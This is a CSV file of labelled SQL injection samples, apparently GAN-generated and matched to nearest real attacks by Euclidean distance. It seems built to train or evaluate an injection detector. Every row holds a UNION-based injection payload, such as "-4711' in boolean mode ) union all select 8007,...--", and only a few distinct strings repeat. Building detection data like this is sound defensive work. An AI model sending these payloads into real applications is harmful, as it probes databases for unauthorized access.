id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,3.9503878913912387
GAN_000002,attack,union,"-5934' union all select 6096,6096,6096,6096,6096#",nearest_attack_euclidean,R000500,4.260180638875848
GAN_000003,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.431574411772601
GAN_000004,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.1313905245513225
GAN_000005,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,3.6988441631662097
GAN_000006,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,3.6789549818283502
GAN_000007,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.009760468800457
GAN_000008,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,3.4057944690823305
GAN_000009,attack,union,"-7845' union all select 9574,9574,9574,9574,9574,9574#",nearest_attack_euclidean,R000292,3.873396954912861
GAN_000010,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.7379226591083925
GAN_000011,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.05529786854019
GAN_000012,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.0467972593282826
GAN_000013,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,3.7685885647381925
GAN_000014,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,3.596432181746126
